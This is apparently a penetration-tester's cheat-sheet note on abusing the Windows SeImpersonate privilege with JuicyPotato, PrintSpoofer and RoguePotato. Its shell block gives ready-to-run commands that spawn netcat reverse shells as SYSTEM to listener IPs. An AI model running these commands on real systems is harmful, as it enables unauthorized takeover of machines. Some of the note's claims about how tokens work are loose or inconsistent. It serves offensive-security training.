In Windows, every process has a token that has information about the account that is running it. These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the `SeImpersonate` privilege is needed. It's only given to administrative accounts.

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the `WinLogon` process to get a `SYSTEM` token, then executing itself with that token placing it within the `SYSTEM` space. Attackers can abuse this privilege with "potato" style exploits.

>[!info]
>Potato-style exploits essentially trick a process running as `SYSTEM` to connect to their process, which hands over the token to be used.

>[!tip]
>We will often run into this privilege after gaining `RCE` via an application that runs in the context of a service account. Whenever we gain access this way, we should immediately check for this privilege as it's often a quick win.

## Exploits

[`JuicyPotato`](https://github.com/ohpe/juicy-potato) for Windows Server below 2019 and Windows 10 below build 1809. For `OS`s above these, we can use [`PrintSpoofer`](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) and [`RoguePotato`](https://github.com/antonioCoco/RoguePotato/).

```shell
# Syntax example for JuicyPotato, just need to start a listener. (cmd.exe only)
.\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

# PowerShell friendly syntax
.\JuicyPotato.exe -l 1337 -p 'C:\Windows\System32\cmd.exe' -a "/c C:\Temp\nc.exe 172.16.1.100 1234 -e cmd.exe" -t "*" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"

# Syntax example for PrintSpoofer, also only need to start a listener.
PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.14.3 8443 -e cmd.exe"
```

>[!tip]
>For `JuicyPotato` and `RoguePotato` we may need to pass a different `CLSID` with `-c <CLSID>`. [Here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) is a list of `CLSID`s by `OS`.